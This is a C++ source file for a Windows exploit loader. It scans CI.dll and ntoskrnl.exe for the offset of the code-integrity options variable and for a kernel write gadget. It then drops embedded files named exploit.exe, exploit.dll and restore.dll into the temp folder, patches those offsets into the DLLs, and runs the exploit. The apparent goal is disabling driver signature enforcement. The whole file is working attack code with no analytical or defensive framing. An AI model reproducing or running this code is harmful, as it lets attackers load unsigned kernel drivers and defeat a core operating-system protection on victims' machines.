#include "global.h"
#include "resource.h"


ULONG FindWriteGadget(_In_ PVOID MappedBase)
{
	const PUCHAR FsRtlInitializeFileLock = reinterpret_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "FsRtlInitializeFileLock"));

	if (FsRtlInitializeFileLock == nullptr)
		return 0;

	// Printf(L"FsRtlInitializeFileLock: %p\n", FsRtlInitializeFileLock);

	LONG Rel = 0;
	ULONG c = 0;
	ULONG j = 0;
	do
	{
		if (*reinterpret_cast<PUSHORT>(FsRtlInitializeFileLock + c) == 0x118948) // MOV qword ptr [RCX],RDX - 48 89 11
		{
			Rel = *reinterpret_cast<PLONG>(FsRtlInitializeFileLock + c);
			break;
		}
		c++;
	} while (c < 256);

	const PUCHAR mov = FsRtlInitializeFileLock + Rel + 2;

	// Printf(L"ntBase:                  %p\n", MappedBase);
	Printf(L"> Offset asm mov:   %p\n", (mov - MappedBase));
	return (mov - MappedBase);
}

ULONG QueryCiOptions(_In_ PVOID MappedBase)
{
	ULONG c;
	LONG Rel = 0;

	const PUCHAR CiInitialize = reinterpret_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "CiInitialize"));
	// Printf(L"CiInitialize:    %p\n", CiInitialize);

	if (CiInitialize == nullptr)
		return 0;

	c = 0;
	ULONG j = 0;
	do
	{
		// call CipInitialize
		if (CiInitialize[c] == 0xE8)
			j++;

		if (j > 2)
		{
			Rel = *reinterpret_cast<PLONG>(CiInitialize + c + 1);
			break;
		}
		c++;
	} while (c < 256);

	const PUCHAR CipInitialize = CiInitialize + c + 5 + Rel;

	// Printf(L"CipInitialize:   %p\n", CipInitialize);
	c = 0;
	do
	{
		if (*reinterpret_cast<PUSHORT>(CipInitialize + c) == 0x0d89)
		{
			Rel = *reinterpret_cast<PLONG>(CipInitialize + c + 2);
			break;
		}
		c++;
	} while (c < 256);

	const PUCHAR MappedCiOptions = CipInitialize + c + 6 + Rel;

	// Printf(L"CiBase:          %p\n", MappedBase);
	// Printf(L"MappedCiOptions: %p\n", MappedCiOptions);
	Printf(L"> Offset CiOptions: %p\n", (MappedCiOptions - MappedBase));
	return (MappedCiOptions - MappedBase);
}

ULONG GetWriteGadgetOffset()
{
	WCHAR Path[MAX_PATH];
	unsigned char NtoskrnlExe[] = { 'n','t','o','s','k','r','n','l','.','e','x','e', 0x0 }; // "ntoskrnl.exe";
	_snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs", SharedUserData->NtSystemRoot, NtoskrnlExe);

	PVOID MappedBase;
	SIZE_T ViewSize;
	NTSTATUS Status = MapFileSectionView(Path, FALSE, &MappedBase, &ViewSize);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Failed to map %ls: %08X\n", Path, Status);
		return 0;
	}
	ULONG offset = FindWriteGadget(MappedBase);
	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
	return offset;
}

ULONG GetCiOptionsOffset()
{
	// Map file as SEC_IMAGE
	WCHAR Path[MAX_PATH];
	unsigned char CiDll[] = { 'C','I','.','d','l','l', 0x0 }; // "CI.dll";
	_snwprintf(Path, MAX_PATH / sizeof(WCHAR), L"%ls\\System32\\%hs", SharedUserData->NtSystemRoot, CiDll);

	PVOID MappedBase;
	SIZE_T ViewSize;
	NTSTATUS Status = MapFileSectionView(Path, FALSE, &MappedBase, &ViewSize);
	if (!NT_SUCCESS(Status))
	{
		Printf(L"Failed to map %ls: %08X\n", Path, Status);
		return 0;
	}

	ULONG offset = QueryCiOptions(MappedBase);
	NtUnmapViewOfSection(NtCurrentProcess, MappedBase);
	return offset;
}

BOOL DropResource(ULONG uResourceId, const char* name, DWORD CiOptionsOffset, DWORD GadgetOffset) {
	CHAR lpTempPathBuffer[MAX_PATH];
	DWORD dwRetVal;
	DWORD dwBytesWritten;
	BOOL result;

	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(uResourceId), TEXT("exploit"));
	if (hRsrc == NULL) {
		return false;
	}

	DWORD dwSize = SizeofResource(NULL, hRsrc);
	if (dwSize == NULL) {
		return false;
	}

	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		return false;
	}

	LPVOID lpRes = LockResource(hGlobal);

	dwRetVal = GetTempPathA(MAX_PATH, lpTempPathBuffer);
	if (dwRetVal > MAX_PATH || (dwRetVal == 0))
		return false;

	HANDLE hTempFile = CreateFileA(
		strcat(lpTempPathBuffer, name),
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	result = WriteFile(hTempFile,
		lpRes,
		dwSize,
		&dwBytesWritten,
		NULL);

	if (!strcmp(name, "exploit.dll")) {
		SetFilePointer(hTempFile, 0x1AC00, NULL, FILE_BEGIN);
		WriteFile(hTempFile, &CiOptionsOffset, 4, &dwBytesWritten, NULL);
		WriteFile(hTempFile, &GadgetOffset, 4, &dwBytesWritten, NULL);
	}
	if (!strcmp(name, "restore.dll")) {
		SetFilePointer(hTempFile, 0x1AC00, NULL, FILE_BEGIN);
		WriteFile(hTempFile, &CiOptionsOffset, 4, &dwBytesWritten, NULL);
		WriteFile(hTempFile, &GadgetOffset, 4, &dwBytesWritten, NULL);

	}
	CloseHandle(hTempFile);
	return result;
}

void DropFile(DWORD CiOptionsOffset, DWORD GadgetOffset) {

	ULONG resIDs[] = { IDR_EXPLOIT1, IDR_EXPLOIT2, IDR_EXPLOIT3};
	const char* names[] = { "exploit.exe", "exploit.dll", "restore.dll" };

	for (int i = 0; i < 3; i++) {
		if (!DropResource(resIDs[i], names[i], CiOptionsOffset, GadgetOffset))
			ExitProcess(-1);
	}
}

int main(int argc, char *argv[]) {
	DWORD CiOptionsOffset;
	DWORD GadgetOffset;
	CHAR lpTempPathBuffer[MAX_PATH];

	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	Printf(L"\n");
	CiOptionsOffset = GetCiOptionsOffset();
	Printf(L"\n");
	GadgetOffset = GetWriteGadgetOffset();
	DropFile(CiOptionsOffset, GadgetOffset);
	GetTempPathA(MAX_PATH, lpTempPathBuffer);
	char* cmdline = strcat(lpTempPathBuffer, "exploit.exe");

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	CreateProcessA(NULL,
		cmdline,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi);
	return 0;
}
